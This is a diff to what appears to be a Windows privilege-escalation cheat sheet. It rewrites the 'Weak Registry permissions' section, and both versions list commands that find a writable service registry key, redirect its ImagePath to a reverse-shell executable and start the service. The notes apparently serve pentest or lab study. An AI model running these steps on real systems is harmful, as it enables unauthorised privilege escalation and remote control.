@@ -1377,18 +1377,23 @@ sc.exe create <SVC> binPath= "C:\Path\app.exe" start= demand
 ### Weak Registry permissions
 
 ```bash
-#Look for the following in Winpeas services info output
-HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means we have full access
+# WinPEAS clue: writable service registry key
+HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE> (Interactive [FullControl])
 
-accesschk /acceptula -uvwqk <path of registry> #Check for KEY_ALL_ACCESS
+# Confirm write access to service registry key
+accesschk.exe -accepteula -uvwqk "HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE>"
 
-#Service Information from regedit, identify the variable that holds the executable
-reg query <reg-path>
+# Inspect service registry values
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE>"
 
-reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
-#Imagepath is the variable here
+# Check service account
+sc.exe qc <SERVICE>
 
-net start <service>
+# Change service executable path
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\<SERVICE>" /v ImagePath /t REG_EXPAND_SZ /d "C:\PrivEsc\reverse.exe" /f
+
+# Start service
+net start <SERVICE>
 ```
 
 ## DLL Hijacking
